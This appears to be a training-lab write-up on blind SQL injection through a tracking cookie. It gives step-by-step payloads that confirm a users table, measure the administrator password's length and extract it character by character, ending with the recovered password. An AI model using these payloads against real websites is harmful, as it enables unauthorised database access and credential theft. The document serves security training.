# Lab: Blind SQL injection with conditional responses

Cookie: TrackingId=cTGVMR526u1AQK6j;

### step1

TrackingId=xyz' AND '1'='1

```sql
TrackingId=cTGVMR526u1AQK6j' AND '1'='1;
```

->TRUE-> Welcome back!

### step2

TrackingId=xyz' AND '1'='2

```sql
TrackingId=cTGVMR526u1AQK6j' AND '1'='2;
```

->TRUE-> no welcome back

### step3

Verify that the condition is true, confirming that there is a table called `users`.

```sql
TrackingId=xyz' AND (SELECT 'a' FROM users LIMIT 1)='a
```

->TRUE-> Welcome back!

### step4

Verify that the condition is true, confirming that there is a user called `administrator`

```sql
TrackingId=xyz' AND (SELECT 'a' FROM users WHERE username='administrator')='a
```

->TRUE-> Welcome back!

### step5

determine how many characters are in the password of the `administrator` user

```sql
TrackingId=xyz' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>1)='a
```

This condition should be true, confirming that the password is greater than 1 character in length.
->TRUE-> Welcome back!

### step6

Send a series of follow-up values to test different password lengths. Send

```sql
TrackingId=xyz' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>2)='a
```

->TRUE-> Welcome back!

### step7

Send a series of follow-up values to test different password lengths. Send

```sql
TrackingId=xyz' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>3)='a
```

### step8

```sql
TrackingId=xyz' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='a
```

### step9

```sql
TrackingId=xyz' AND (SELECT SUBSTRING(password,§1§,1) FROM users WHERE username='administrator')='§a§
```

```Notes
1   2  3  4  5  6  7  8  9  10  11  12  13  14  15  16  17  18  19  20
8   s  j  o  5  a  c  y  s e r  a    m   f    y     c   g   q    p    v
8sjo5acyseramfycgqpv
```

`Attack type cluster bomb`
![screenshot](./images/attack_type.png)

`1st payload`
![screenshot](./images/first_payload.png)

`2nd payload`
![screenshot](./images/second_payload.png)

Lab: Blind SQL injection with conditional responses
